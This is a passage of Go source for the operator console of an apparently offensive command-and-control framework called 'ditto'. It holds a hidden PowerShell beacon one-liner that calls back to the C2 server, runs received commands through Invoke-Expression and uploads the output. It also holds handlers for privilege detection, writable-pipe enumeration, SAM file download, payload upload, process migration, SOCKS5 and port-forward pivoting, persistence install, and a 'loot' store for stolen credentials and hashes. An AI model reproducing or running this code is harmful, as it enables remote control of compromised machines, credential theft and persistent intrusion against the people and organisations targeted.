		return nil, fmt.Errorf("AccessChk named pipe enumeration failed or timed out")
	}

	var output string
	if resultMap, ok := taskResult.Result.(map[string]interface{}); ok {
		if resultValue, ok := resultMap["result"].(string); ok {
			output = resultValue
		}
	}

	if output == "" {
		return nil, fmt.Errorf("AccessChk returned no output")
	}

	// Check if AccessChk is available
	if strings.Contains(strings.ToLower(output), "not recognized") ||
		strings.Contains(strings.ToLower(output), "not found") ||
		strings.Contains(strings.ToLower(output), "cannot find") {
		return nil, fmt.Errorf("AccessChk not available on target system")
	}

	// Parse output to extract pipe names
	// AccessChk output format:
	// \pipe\pipe_name
	// RW account1
	// R account2
	pipes := make([]string, 0)
	lines := strings.Split(output, "\n")

	for i, line := range lines {
		line = strings.TrimSpace(line)

		// Look for pipe paths (start with \pipe\)
		if strings.HasPrefix(line, "\\pipe\\") {
			// Check if next line has write permissions
			if i+1 < len(lines) {
				nextLine := strings.TrimSpace(lines[i+1])
				// If next line has W or RW, this pipe is writable
				if strings.HasPrefix(nextLine, "W") || strings.HasPrefix(nextLine, "RW") {
					// Extract pipe name
					pipeName := strings.TrimPrefix(line, "\\pipe\\")
					if pipeName != "" {
						pipes = append(pipes, pipeName)
					}
				}
			}
		}
	}

	return pipes, nil
}

// detectPrivilegeLevel detects the current privilege level of a session
func (is *InteractiveServer) detectPrivilegeLevel(sessionID string) (core.PrivilegeLevel, string, error) {
	// Execute whoami /groups to detect privilege level
	params := map[string]interface{}{
		"session_id": sessionID,
	}

	taskID := fmt.Sprintf("task-%d", time.Now().UnixNano())
	task := &tasks.Task{
		ID:         taskID,
		Type:       "shell",
		Command:    "whoami /groups",
		Parameters: params,
	}
	is.server.EnqueueTask(task)

	// Wait for result
	is.pollTaskResultWithTimeout(sessionID, taskID, 10*time.Second)

	whoamiTask := is.taskQueue.Get(taskID)
	if whoamiTask == nil || whoamiTask.Status != "completed" {
		// Fallback: try whoami without /groups
		taskID2 := fmt.Sprintf("task-%d", time.Now().UnixNano())
		task2 := &tasks.Task{
			ID:         taskID2,
			Type:       "shell",
			Command:    "whoami",
			Parameters: params,
		}
		is.server.EnqueueTask(task2)
		is.pollTaskResultWithTimeout(sessionID, taskID2, 10*time.Second)
		whoamiTask = is.taskQueue.Get(taskID2)
	}

	if whoamiTask == nil || whoamiTask.Status != "completed" {
		return core.PrivilegeUnknown, "", fmt.Errorf("failed to execute whoami command")
	}

	var output string
	if whoamiTask.Result != nil {
		if resultMap, ok := whoamiTask.Result.(map[string]interface{}); ok {
			if resultValue, ok := resultMap["result"].(string); ok {
				output = resultValue
			}
		}
	}

	// Parse output to determine privilege level
	outputLower := strings.ToLower(output)
	username := ""

	// Extract username
	if strings.Contains(outputLower, "nt authority\\system") {
		return core.PrivilegeSystem, "NT AUTHORITY\\SYSTEM", nil
	}

	// Check for admin groups
	if strings.Contains(outputLower, "s-1-5-32-544") || // Administrators group SID
		strings.Contains(outputLower, "administrators") ||
		strings.Contains(outputLower, "high integrity") {
		// Extract username from whoami output
		lines := strings.Split(output, "\n")
		for _, line := range lines {
			if strings.Contains(strings.ToLower(line), "user name") {
				parts := strings.Split(line, ":")
				if len(parts) > 1 {
					username = strings.TrimSpace(parts[1])
				}
			}
		}
		if username == "" {
			// Try to get from first line
			if len(lines) > 0 {
				username = strings.TrimSpace(lines[0])
			}
		}
		return core.PrivilegeAdmin, username, nil
	}

	// Extract username
	lines := strings.Split(output, "\n")
	if len(lines) > 0 {
		username = strings.TrimSpace(lines[0])
	}

	return core.PrivilegeUser, username, nil
}

// spawnElevatedBeacon spawns a new beacon with elevated privileges
func (is *InteractiveServer) spawnElevatedBeacon(sessionID string, targetPriv core.PrivilegeLevel) error {
	// Get session to determine callback URL
	session, ok := is.sessionMgr.GetSession(sessionID)
	if !ok {
		return fmt.Errorf("session not found")
	}

	// Get callback URL from session's transport
	callbackURL := ""
	if session.Transport == "http" || session.Transport == "https" {
		// Extract from session metadata or config
		if callbackMeta, ok := session.GetMetadata("callback_url"); ok {
			if callbackStr, ok := callbackMeta.(string); ok {
				callbackURL = callbackStr
			}
		}
		if callbackURL == "" {
			// Use default from config
			if is.config != nil {
				callbackURL = fmt.Sprintf("%s://%s:%d",
					is.config.Communication.Protocol,
					is.config.Server.Host,
					is.config.Server.Port)
			}
		}
	}

	if callbackURL == "" {
		return fmt.Errorf("could not determine callback URL for new beacon")
	}

	// Generate a PowerShell one-liner that spawns a new beacon as SYSTEM
	// This creates a new process that connects back to the C2 server
	// We'll use a PowerShell download cradle that connects to the beacon endpoint
	spawnCmd := fmt.Sprintf(`powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$callback='%s';$id=[System.Guid]::NewGuid().ToString().Substring(0,8);while($true){try{$r=Invoke-WebRequest -Uri \"$callback/beacon\" -Headers @{'X-Session-ID'=$id;'User-Agent'='Mozilla/5.0'} -UseBasicParsing;$j=$r.Content|ConvertFrom-Json;if($j.tasks){foreach($t in$j.tasks){if($t.type-eq'shell'){Invoke-Expression $t.command|Out-String|ConvertTo-Json|$wb=New-Object Net.WebClient;$wb.Headers.Add('X-Session-ID',$id);$wb.UploadString(\"$callback/result\",$_)}}};Start-Sleep -Seconds $j.sleep}catch{Start-Sleep -Seconds 5}}"`, callbackURL)

	// Execute the spawn command in the elevated context
	params := map[string]interface{}{
		"session_id": sessionID,
	}

	taskID := fmt.Sprintf("task-%d", time.Now().UnixNano())
	task := &tasks.Task{
		ID:         taskID,
		Type:       "shell",
		Command:    spawnCmd,
		Parameters: params,
	}
	is.server.EnqueueTask(task)

	fmt.Printf("[*] Spawn command queued (task: %s). New beacon should connect shortly.\n", taskID)
	return nil
}

func (is *InteractiveServer) executeKill(sessionID string) error {
	if is.server == nil {
		return fmt.Errorf("server not initialized\n" +
			"  Ensure the C2 server is running with 'server start'")
	}

	// Validate session exists
	if _, ok := is.sessionMgr.GetSession(sessionID); !ok {
		return fmt.Errorf("session not found: %s\n"+
			"  Session may have disconnected. Use 'sessions' to list active sessions", shortID(sessionID))
	}

	// Mark session as dead first to prevent reconnection
	session, ok := is.sessionMgr.GetSession(sessionID)
	if ok {
		session.SetState(core.SessionStateDead)
		// Publish SessionKilled event
		core.EventBroker.Publish(core.Event{
			EventType: core.EventSessionKilled,
			Session:   session,
			Metadata: map[string]interface{}{
				"session_id": session.GetID(), // Use getter for thread safety
				"reason":     "operator_killed",
			},
		})
	}

	// Queue kill task for session
	taskID := fmt.Sprintf("task-%d", time.Now().UnixNano())
	task := &tasks.Task{
		ID:      taskID,
		Type:    "kill",
		Command: "kill",
		Parameters: map[string]interface{}{
			"session_id": sessionID,
		},
	}
	is.server.EnqueueTask(task)
	fmt.Printf("[+] Queued kill command (task: %s)\n", taskID)
	fmt.Printf("[*] Implant will terminate and session will be closed\n")

	// Wait a moment for the kill task to be sent to the implant
	time.Sleep(2 * time.Second)

	// Mark session as dead (don't remove immediately so it shows in sessions list)
	// Sessions will be cleaned up by CleanupDeadSessions after timeout
	fmt.Printf("[+] Session %s marked as dead\n", shortID(sessionID))

	return nil
}

func (is *InteractiveServer) downloadFile(sessionID, remotePath string) error {
	if is.server == nil {
		return fmt.Errorf("server not initialized\n" +
			"  Ensure the C2 server is running with 'server start'")
	}

	if remotePath == "" {
		return fmt.Errorf("remote path cannot be empty\n" +
			"  Usage: download <remote_path>\n" +
			"  Example: download C:\\Windows\\System32\\config\\sam")
	}

	// Validate session exists
	if _, ok := is.sessionMgr.GetSession(sessionID); !ok {
		return fmt.Errorf("session not found: %s\n"+
			"  Session may have disconnected. Use 'sessions' to list active sessions", shortID(sessionID))
	}

	task := &tasks.Task{
		ID:      fmt.Sprintf("task-%d", time.Now().UnixNano()),
		Type:    "download",
		Command: remotePath,
		Parameters: map[string]interface{}{
			"session_id": sessionID,
		},
	}
	is.server.EnqueueTask(task)
	fmt.Printf("[+] Queued download: %s\n", remotePath)
	return nil
}

func (is *InteractiveServer) uploadFile(sessionID, localPath, remotePath string) error {
	if is.server == nil {
		return fmt.Errorf("server not initialized\n" +
			"  Ensure the C2 server is running with 'server start'")
	}

	if localPath == "" {
		return fmt.Errorf("local path cannot be empty\n" +
			"  Usage: upload <local_path> <remote_path>\n" +
			"  Example: upload /tmp/payload.exe C:\\Windows\\Temp\\payload.exe")
	}

	if remotePath == "" {
		return fmt.Errorf("remote path cannot be empty\n" +
			"  Usage: upload <local_path> <remote_path>\n" +
			"  Example: upload /tmp/payload.exe C:\\Windows\\Temp\\payload.exe")
	}

	// Check if local file exists
	if _, err := os.Stat(localPath); os.IsNotExist(err) {
		return fmt.Errorf("local file not found: %s\n"+
			"  Usage: upload <local_path> <remote_path>\n"+
			"  Note: Provide the full path to the file you want to upload\n"+
			"  Example: upload /tmp/payload.exe C:\\Windows\\Temp\\payload.exe", localPath)
	}

	// Validate session exists
	if _, ok := is.sessionMgr.GetSession(sessionID); !ok {
		return fmt.Errorf("session not found: %s\n"+
			"  Session may have disconnected. Use 'sessions' to list active sessions", shortID(sessionID))
	}

	data, err := os.ReadFile(localPath)
	if err != nil {
		return fmt.Errorf("failed to read file '%s': %w\n"+
			"  Check file permissions and ensure the file is readable", localPath, err)
	}

	task := &tasks.Task{
		ID:      fmt.Sprintf("task-%d", time.Now().UnixNano()),
		Type:    "upload",
		Command: remotePath,
		Parameters: map[string]interface{}{
			"session_id": sessionID,
			"data":       string(data),
		},
	}
	is.server.EnqueueTask(task)
	fmt.Printf("[+] Queued upload: %s -> %s (%d bytes)\n", localPath, remotePath, len(data))
	return nil
}

func (is *InteractiveServer) migrateProcess(sessionID string, pid int) error {
	if is.server == nil {
		return fmt.Errorf("server not initialized\n" +
			"  Ensure the C2 server is running with 'server start'")
	}

	if pid <= 0 {
		return fmt.Errorf("invalid process ID: %d (must be positive)\n"+
			"  Usage: migrate <pid>\n"+
			"  Example: migrate 1234", pid)
	}

	// Validate session exists
	if _, ok := is.sessionMgr.GetSession(sessionID); !ok {
		return fmt.Errorf("session not found: %s\n"+
			"  Session may have disconnected. Use 'sessions' to list active sessions", shortID(sessionID))
	}

	task := &tasks.Task{
		ID:      fmt.Sprintf("task-%d", time.Now().UnixNano()),
		Type:    "migrate",
		Command: fmt.Sprintf("%d", pid),
		Parameters: map[string]interface{}{
			"session_id": sessionID,
			"pid":        pid,
		},
	}
	is.server.EnqueueTask(task)
	fmt.Printf("[+] Queued process migration to PID %d\n", pid)
	return nil
}

func (is *InteractiveServer) executeFilesystemOp(sessionID, op string, path string, args ...string) error {
	if is.server == nil {
		return fmt.Errorf("server not initialized\n" +
			"  Ensure the C2 server is running with 'server start'")
	}

	if path == "" {
		usage := fmt.Sprintf("%s <path>", op)
		example := fmt.Sprintf("%s /etc/passwd", op)
		if op == "head" || op == "tail" {
			usage = fmt.Sprintf("%s <path> [lines]", op)
			example = fmt.Sprintf("%s /etc/passwd 20", op)
		} else if op == "grep" {
			usage = "grep <pattern> <path>"
			example = "grep 'ERROR' /var/log/app.log"
		}
		return fmt.Errorf("path cannot be empty for %s operation\n"+
			"  Usage: %s\n"+
			"  Example: %s", op, usage, example)
	}

	// Validate session exists
	if _, ok := is.sessionMgr.GetSession(sessionID); !ok {
		return fmt.Errorf("session not found: %s\n"+
			"  Session may have disconnected. Use 'sessions' to list active sessions", shortID(sessionID))
	}

	task := &tasks.Task{
		ID:      fmt.Sprintf("task-%d", time.Now().UnixNano()),
		Type:    "filesystem",
		Command: op,
		Parameters: map[string]interface{}{
			"session_id": sessionID,
			"path":       path,
			"args":       args,
		},
	}
	is.server.EnqueueTask(task)
	fmt.Printf("[+] Queued %s operation: %s\n", op, path)
	return nil
}

func (is *InteractiveServer) handlePortForward(args []string) error {
	var sessionID, localAddr, remoteAddr string

	// Determine if we're using current session or provided session ID
	if is.currentSession != "" {
		// Validate current session still exists
		if _, ok := is.sessionMgr.GetSession(is.currentSession); !ok {
			is.currentSession = "" // Clear invalid session
			return fmt.Errorf("current session is no longer active\n" +
				"  Use 'sessions' command to list all active sessions\n" +
				"  Then use 'use <session_id>' to select a new session")
		}

		// Use current session - need local and remote addresses
		if len(args) < 2 {
			return fmt.Errorf("insufficient arguments\n" +
				"  Usage (with active session): port-forward <local_addr> <remote_addr>\n" +
				"  Usage (with session ID): port-forward <session_id> <local_addr> <remote_addr>\n" +
				"  Expected format: <host>:<port>\n" +
				"  Example: port-forward 127.0.0.1:8080 192.168.1.100:3389\n" +
				"  Example: port-forward sess-123 127.0.0.1:8080 192.168.1.100:3389")
		}
		sessionID = is.currentSession
		localAddr = args[0]
		remoteAddr = args[1]
	} else {
		// Session ID must be provided - need session_id, local, and remote
		if len(args) < 3 {
			return fmt.Errorf("insufficient arguments\n" +
				"  Usage: port-forward <session_id> <local_addr> <remote_addr>\n" +
				"  Expected format: <host>:<port>\n" +
				"  Example: port-forward sess-123 127.0.0.1:8080 192.168.1.100:3389\n" +
				"  Note: If you're in a session, you can omit the session_id")
		}
		sessionID = args[0]
		localAddr = args[1]
		remoteAddr = args[2]

		// Validate session exists
		if _, ok := is.sessionMgr.GetSession(sessionID); !ok {
			return fmt.Errorf("session not found: %s\n"+
				"  Use 'sessions' command to list all active sessions\n"+
				"  Note: You can use partial session IDs (first 8 characters)", sessionID)
		}
	}

	// Validate addresses
	if err := validateAddress(localAddr); err != nil {
		return fmt.Errorf("invalid local address '%s': %w\n"+
			"  Expected format: <host>:<port>\n"+
			"  Examples: 127.0.0.1:8080, 0.0.0.0:9000\n"+
			"  Note: Port must be between 1 and 65535", localAddr, err)
	}
	if err := validateAddress(remoteAddr); err != nil {
		return fmt.Errorf("invalid remote address '%s': %w\n"+
			"  Expected format: <host>:<port>\n"+
			"  Examples: 192.168.1.100:3389, 10.0.0.5:22\n"+
			"  Note: Port must be between 1 and 65535", remoteAddr, err)
	}

	pf, err := is.pivotManager.AddPortForward(sessionID, remoteAddr, localAddr)
	if err != nil {
		return fmt.Errorf("failed to create port forward: %w", err)
	}

	ctx := context.Background()
	if err := pf.Start(ctx, func(conn net.Conn) {
		// Forward connection through session
		// Create a task to establish remote connection on implant side
		if is.server == nil {
			is.logger.Error("Server is nil, cannot queue port forward task")
			conn.Close()
			return
		}

		task := &tasks.Task{
			ID:      fmt.Sprintf("task-%d", time.Now().UnixNano()),
			Type:    "portforward",
			Command: remoteAddr,
			Parameters: map[string]interface{}{
				"session_id":  sessionID,
				"local_addr":  localAddr,
				"remote_addr": remoteAddr,
				"conn_id":     fmt.Sprintf("conn-%d", time.Now().UnixNano()),
			},
		}
		is.server.EnqueueTask(task)

		is.logger.Info("Port forward connection from %s - task queued for session %s", conn.RemoteAddr(), sessionID)
		// Connection will be handled by implant when it receives the task
		// Close local connection as implant will handle forwarding
		conn.Close()
	}); err != nil {
		return fmt.Errorf("failed to start port forward: %w", err)
	}

	fmt.Printf("[+] Port forward created (ID: %d)\n", pf.ID)
	fmt.Printf("    Local: %s -> Remote: %s\n", localAddr, remoteAddr)
	return nil
}

func (is *InteractiveServer) handleSOCKS5(args []string) error {
	var sessionID, bindAddr, username, password string

	// Determine if we're using current session or provided session ID
	if is.currentSession != "" {
		// Validate current session still exists
		if _, ok := is.sessionMgr.GetSession(is.currentSession); !ok {
			is.currentSession = "" // Clear invalid session
			return fmt.Errorf("current session is no longer active\n" +
				"  Use 'sessions' command to list all active sessions\n" +
				"  Then use 'use <session_id>' to select a new session")
		}

		// Use current session - need bind address
		if len(args) < 1 {
			return fmt.Errorf("insufficient arguments\n" +
				"  Usage (with active session): socks5 <bind_addr> [username] [password]\n" +
				"  Usage (with session ID): socks5 <session_id> <bind_addr> [username] [password]\n" +
				"  Expected format: <host>:<port>\n" +
				"  Example: socks5 127.0.0.1:1080\n" +
				"  Example: socks5 sess-123 127.0.0.1:1080 user pass")
		}
		sessionID = is.currentSession
		bindAddr = args[0]
		if len(args) >= 2 {
			username = args[1]
		}
		if len(args) >= 3 {
			password = args[2]
		}
	} else {
		// Session ID must be provided - need session_id and bind_addr
		if len(args) < 2 {
			return fmt.Errorf("insufficient arguments\n" +
				"  Usage: socks5 <session_id> <bind_addr> [username] [password]\n" +
				"  Expected format: <host>:<port>\n" +
				"  Example: socks5 sess-123 127.0.0.1:1080\n" +
				"  Example: socks5 sess-123 127.0.0.1:1080 user pass\n" +
				"  Note: If you're in a session, you can omit the session_id")
		}
		sessionID = args[0]
		bindAddr = args[1]
		if len(args) >= 3 {
			username = args[2]
		}
		if len(args) >= 4 {
			password = args[3]
		}

		// Validate session exists
		if _, ok := is.sessionMgr.GetSession(sessionID); !ok {
			return fmt.Errorf("session not found: %s\n"+
				"  Use 'sessions' command to list all active sessions\n"+
				"  Note: You can use partial session IDs (first 8 characters)", sessionID)
		}
	}

	// Validate bind address
	if err := validateAddress(bindAddr); err != nil {
		return fmt.Errorf("invalid bind address '%s': %w\n"+
			"  Expected format: <host>:<port>\n"+
			"  Examples: 127.0.0.1:1080, 0.0.0.0:9050\n"+
			"  Note: Port must be between 1 and 65535", bindAddr, err)
	}

	proxy, err := is.socksManager.AddSOCKS5(sessionID, bindAddr, username, password)
	if err != nil {
		return fmt.Errorf("failed to create SOCKS5 proxy: %w", err)
	}

	ctx := context.Background()
	if err := proxy.Start(ctx, func(conn net.Conn) {
		// Handle SOCKS5 protocol through session
		// Create a task to establish SOCKS5 proxy on implant side
		if is.server == nil {
			is.logger.Error("Server is nil, cannot queue SOCKS5 task")
			conn.Close()
			return
		}

		task := &tasks.Task{
			ID:      fmt.Sprintf("task-%d", time.Now().UnixNano()),
			Type:    "socks5",
			Command: bindAddr,
			Parameters: map[string]interface{}{
				"session_id": sessionID,
				"bind_addr":  bindAddr,
				"username":   username,
				"password":   password,
				"conn_id":    fmt.Sprintf("conn-%d", time.Now().UnixNano()),
			},
		}
		is.server.EnqueueTask(task)

		is.logger.Info("SOCKS5 connection from %s - task queued for session %s", conn.RemoteAddr(), sessionID)
		// Connection will be handled by implant when it receives the task
		// Close local connection as implant will handle proxying
		conn.Close()
	}); err != nil {
		return fmt.Errorf("failed to start SOCKS5 proxy: %w", err)
	}

	fmt.Printf("[+] SOCKS5 proxy started (ID: %d) on %s\n", proxy.ID, bindAddr)
	return nil
}

func (is *InteractiveServer) handleLoot(args []string) error {
	if len(args) == 0 {
		return is.printLoot()
	}

	switch args[0] {
	case "list", "ls":
		return is.printLoot()
	case "add":
		if len(args) < 3 {
			return fmt.Errorf("insufficient arguments\n" +
				"  Usage: loot add <type> <name> <data>\n" +
				"  Valid types: credential, file, token, hash\n" +
				"  Example: loot add credential admin_pass 'password123'\n" +
				"  Example: loot add file /etc/passwd 'file contents here'")
		}
		lootTypeStr := strings.ToLower(args[1])
		validLootTypes := map[string]bool{"credential": true, "file": true, "token": true, "hash": true}
		if !validLootTypes[lootTypeStr] {
			return fmt.Errorf("invalid loot type '%s'\n"+
				"  Valid types: credential, file, token, hash\n"+
				"  Usage: loot add <type> <name> <data>\n"+
				"  Example: loot add credential admin_pass 'password123'", args[1])
		}
		lootType := loot.LootType(lootTypeStr)
		name := args[2]
		data := []byte(strings.Join(args[3:], " "))
		if len(args) == 3 {
			data = []byte(name)
		}
		if name == "" {
			return fmt.Errorf("loot name cannot be empty\n" +
				"  Usage: loot add <type> <name> <data>\n" +
				"  Example: loot add credential admin_pass 'password123'")
		}
		id, err := is.lootManager.AddLoot(lootType, name, data, nil)
		if err != nil {
			return fmt.Errorf("failed to add loot: %w", err)
		}
		fmt.Printf("[+] Added loot: %s\n", id)
	case "get":
		if len(args) < 2 {
			return fmt.Errorf("insufficient arguments\n" +
				"  Usage: loot get <id>\n" +
				"  Use 'loot list' to see all loot items with their IDs")
		}
		if args[1] == "" {
			return fmt.Errorf("loot ID cannot be empty\n" +
				"  Usage: loot get <id>\n" +
				"  Use 'loot list' to see all loot items with their IDs")
		}
		item, err := is.lootManager.GetLoot(args[1])
		if err != nil {
			return fmt.Errorf("failed to get loot: %w\n"+
				"  Use 'loot list' to see all loot items with their IDs", err)
		}
		data, err := is.lootManager.DecryptLoot(item)
		if err != nil {
			return fmt.Errorf("failed to decrypt loot: %w", err)
		}
		fmt.Printf("[+] Loot %s:\n", item.ID)
		fmt.Printf("    Type: %s\n", item.Type)
		fmt.Printf("    Name: %s\n", item.Name)
		fmt.Printf("    Data: %s\n", string(data))
	case "remove", "rm":
		if len(args) < 2 {
			return fmt.Errorf("insufficient arguments\n" +
				"  Usage: loot remove <id>\n" +
				"  Use 'loot list' to see all loot items with their IDs")
		}
		if args[1] == "" {
			return fmt.Errorf("loot ID cannot be empty\n" +
				"  Usage: loot remove <id>\n" +
				"  Use 'loot list' to see all loot items with their IDs")
		}
		if err := is.lootManager.RemoveLoot(args[1]); err != nil {
			return fmt.Errorf("failed to remove loot: %w\n"+
				"  Use 'loot list' to see all loot items with their IDs", err)
		}
		fmt.Printf("[+] Removed loot: %s\n", args[1])
	case "export":
		data, err := is.lootManager.Export()
		if err != nil {
			return err
		}
		fmt.Println(string(data))
	default:
		return fmt.Errorf("unknown loot subcommand '%s'\n"+
			"  Usage: loot [list|add|get|remove|export]\n"+
			"  Commands:\n"+
			"    list, ls     - List all loot items\n"+
			"    add          - Add a new loot item\n"+
			"                   Usage: loot add <type> <name> <data>\n"+
			"    get          - Get loot item details\n"+
			"                   Usage: loot get <id>\n"+
			"    remove, rm   - Remove a loot item\n"+
			"                   Usage: loot remove <id>\n"+
			"    export       - Export all loot as JSON\n"+
			"  Examples:\n"+
			"    loot list\n"+
			"    loot add credential admin_pass 'password123'\n"+
			"    loot get loot-123\n"+
			"    loot remove loot-123", args[0])
	}

	return nil
}

func (is *InteractiveServer) printLoot() error {
	items := is.lootManager.ListLoot()
	if len(items) == 0 {
		fmt.Println("[*] No loot items")
		return nil
	}

	t := table.NewWriter()
	t.SetStyle(table.StyleColoredBright)
	t.AppendHeader(table.Row{"ID", "Type", "Name", "Created"})

	for _, item := range items {
		t.AppendRow(table.Row{
			shortID(item.ID),
			item.Type,
			item.Name,
			item.CreatedAt.Format("2006-01-02 15:04:05"),
		})
	}

	fmt.Println(t.Render())
	return nil
}

func (is *InteractiveServer) handlePersistence(args []string) error {
	if len(args) == 0 {
		return fmt.Errorf("insufficient arguments\n" +
			"  Usage: persist <action> <session_id>\n" +
			"  Actions: install, remove\n" +
			"  Example: persist install sess-123\n" +
			"  Note: If you're in a session, you can omit the session_id")
	}

	var action, sessionID string

	// Determine if we're using current session or provided session ID
	if is.currentSession != "" && len(args) == 1 {
		// Validate current session still exists
		if _, ok := is.sessionMgr.GetSession(is.currentSession); !ok {
			is.currentSession = "" // Clear invalid session
			return fmt.Errorf("current session is no longer active\n" +
				"  Use 'sessions' command to list all active sessions\n" +
				"  Then use 'use <session_id>' to select a new session")
		}

		// Use current session - only action provided
		action = strings.ToLower(args[0])
		sessionID = is.currentSession
	} else if len(args) >= 2 {
		// Session ID provided
		action = strings.ToLower(args[0])
		sessionID = args[1]
	} else {
		return fmt.Errorf("insufficient arguments\n" +
			"  Usage: persist <action> <session_id>\n" +
			"  Actions: install, remove\n" +
			"  Example: persist install sess-123\n" +
			"  Note: If you're in a session, you can use: persist install")
	}

	// Validate action
	validActions := map[string]bool{"install": true, "remove": true}
	if !validActions[action] {
		return fmt.Errorf("invalid action '%s'\n"+
			"  Valid actions: install, remove\n"+
			"  Usage: persist <action> <session_id>\n"+
			"  Example: persist install sess-123", args[0])
	}

	// Validate session exists
	if _, ok := is.sessionMgr.GetSession(sessionID); !ok {
		return fmt.Errorf("session not found: %s\n"+
			"  Use 'sessions' command to list all active sessions\n"+
			"  Note: You can use partial session IDs (first 8 characters)", sessionID)
	}

	if !is.isServerRunning() || is.server == nil {
		return fmt.Errorf("server is not running - you must start the C2 server first\n" +
			"  Usage: server [<address>]\n" +
			"  Example: server 0.0.0.0:8443")
	}

	switch action {
	case "install":
		// Queue persistence installation task
		task := &tasks.Task{
			ID:      fmt.Sprintf("task-%d", time.Now().UnixNano()),
			Type:    "persist",
			Command: "install",
			Parameters: map[string]interface{}{
				"session_id": sessionID,
			},
		}
		is.server.EnqueueTask(task)
		fmt.Printf("[+] Queued persistence installation for session %s\n", shortID(sessionID))
	case "remove":
		task := &tasks.Task{
			ID:      fmt.Sprintf("task-%d", time.Now().UnixNano()),
			Type:    "persist",
			Command: "remove",
			Parameters: map[string]interface{}{
				"session_id": sessionID,
			},
		}
		is.server.EnqueueTask(task)
		fmt.Printf("[+] Queued persistence removal for session %s\n", shortID(sessionID))
	}

	return nil
}

func (is *InteractiveServer) handleImplants(args []string) error {
	builds, err := database.GetImplantBuilds()
	if err != nil {
		return fmt.Errorf("failed to retrieve implants: %w", err)
	}

	if len(builds) == 0 {
		fmt.Println("[*] No saved implants")
		return nil
	}

	t := table.NewWriter()
	t.SetStyle(table.StyleColoredBright)
	t.AppendHeader(table.Row{"ID", "Name", "Type", "OS", "Arch", "Size", "Created"})

	for _, build := range builds {
		t.AppendRow(table.Row{
			shortID(build.ID),
			build.Name,
			build.Type,
			build.OS,
			build.Arch,
			fmt.Sprintf("%d bytes", build.Size),
			time.Unix(build.CreatedAt, 0).Format("2006-01-02 15:04:05"),
		})
	}

	fmt.Println(t.Render())
	return nil
}

func (is *InteractiveServer) handleGetImplant(args []string) error {
	if len(args) == 0 {
		return fmt.Errorf("insufficient arguments\n" +
			"  Usage: implant <id>\n" +
			"  Use 'implants' command to list all saved implants with their IDs")
	}

	if args[0] == "" {
		return fmt.Errorf("implant ID cannot be empty\n" +
			"  Usage: implant <id>\n" +
			"  Use 'implants' command to list all saved implants with their IDs")
	}

	build, err := database.GetImplantBuildByID(args[0])
	if err != nil {
		return fmt.Errorf("failed to retrieve implant: %w\n"+
			"  Use 'implants' command to list all saved implants with their IDs", err)
	}

	fmt.Printf("[+] Implant Build Details:\n")
	fmt.Printf("    ID: %s\n", build.ID)
	fmt.Printf("    Name: %s\n", build.Name)
	fmt.Printf("    Type: %s\n", build.Type)
	fmt.Printf("    OS: %s\n", build.OS)
	fmt.Printf("    Arch: %s\n", build.Arch)
	fmt.Printf("    Callback URL: %s\n", build.CallbackURL)
	fmt.Printf("    Delay: %d seconds\n", build.Delay)
	fmt.Printf("    Jitter: %.2f\n", build.Jitter)
	fmt.Printf("    User-Agent: %s\n", build.UserAgent)
	fmt.Printf("    Protocol: %s\n", build.Protocol)
	fmt.Printf("    Output Path: %s\n", build.OutputPath)
	fmt.Printf("    Size: %d bytes\n", build.Size)
	fmt.Printf("    Created: %s\n", time.Unix(build.CreatedAt, 0).Format("2006-01-02 15:04:05"))
	if build.Modules != "" {
		fmt.Printf("    Modules: %s\n", build.Modules)
	}
	if build.Evasion != "" {
		fmt.Printf("    Evasion: %s\n", build.Evasion)
	}

	return nil
}

func (is *InteractiveServer) isServerRunning() bool {
	is.serverMu.RLock()
	defer is.serverMu.RUnlock()
	return is.serverRunning
}

func (is *InteractiveServer) setServerRunning(running bool) {
	is.serverMu.Lock()
	defer is.serverMu.Unlock()
	is.serverRunning = running
}

func shortID(id string) string {
	if len(id) <= 8 {
		return id
	}
	return id[:8]
}

// shortTaskID returns a shortened task ID for display (removes "task-" prefix)
func shortTaskID(taskID string) string {
	if strings.HasPrefix(taskID, "task-") {
		return taskID[5:] // Remove "task-" prefix
	}
	return shortID(taskID)
}

// getPrompt returns the prompt string for the current session
func getPrompt(currentSession string) string {
	if currentSession == "" {
		return "[ditto] > "
	}
	return fmt.Sprintf("[ditto %s] > ", shortID(currentSession))
}

// validateCallbackURL validates that a callback URL is in a valid format
func validateCallbackURL(url string) error {
	if url == "" {
		return fmt.Errorf("callback URL cannot be empty")
	}

	// Check if URL has protocol
	if !strings.HasPrefix(url, "http://") && !strings.HasPrefix(url, "https://") {
		// If no protocol, assume http:// (will be auto-added in generator)
		url = "http://" + url
	}

	// Try to parse as URL
	// We'll do basic validation since net/url might be too strict for our use case
	// Allow formats like: http://host:port, https://host:port, http://host, https://host
	parts := strings.Split(strings.TrimPrefix(strings.TrimPrefix(url, "http://"), "https://"), "/")
	if len(parts) == 0 {
		return fmt.Errorf("invalid URL format\n" +
			"  Expected format: <protocol>://<host>[:<port>]\n" +
			"  Valid protocols: http, https\n" +
			"  Examples: http://192.168.1.100:8443, https://example.com:443")
	}

	hostPort := parts[0]
	if hostPort == "" {
		return fmt.Errorf("host cannot be empty\n" +
			"  Expected format: <protocol>://<host>[:<port>]\n" +
			"  Valid protocols: http, https\n" +
			"  Examples: http://192.168.1.100:8443, https://example.com")
	}

	// Validate host:port format if port is present
	if strings.Contains(hostPort, ":") {
		host, port, err := net.SplitHostPort(hostPort)
		if err != nil {
			return fmt.Errorf("invalid host:port format: %w", err)
		}
		if host == "" {
			return fmt.Errorf("host cannot be empty")
		}
		if port == "" {
			return fmt.Errorf("port cannot be empty")
		}
		portNum, err := strconv.Atoi(port)
		if err != nil {
			return fmt.Errorf("port must be a number: %w", err)
		}
		if portNum < 1 || portNum > 65535 {
			return fmt.Errorf("port must be between 1 and 65535, got %d", portNum)
		}
	}

	return nil
}

// validateAddress validates that an address is in the format host:port
func validateAddress(addr string) error {
	host, port, err := net.SplitHostPort(addr)
	if err != nil {
		return fmt.Errorf("invalid address format: %w\n"+
			"  Expected format: <host>:<port>\n"+
			"  Examples: 0.0.0.0:8443, 127.0.0.1:8080\n"+
			"  Note: Port is required and must be between 1 and 65535", err)
	}

	if host == "" {
		return fmt.Errorf("host cannot be empty")
	}

	if port == "" {
		return fmt.Errorf("port cannot be empty")
	}

	// Validate port is a number
	portNum, err := strconv.Atoi(port)
	if err != nil {
		return fmt.Errorf("port must be a number: %w", err)
	}

	if portNum < 1 || portNum > 65535 {
		return fmt.Errorf("port must be between 1 and 65535, got %d", portNum)
	}

	return nil
}

// syncSessions periodically syncs sessions from the server
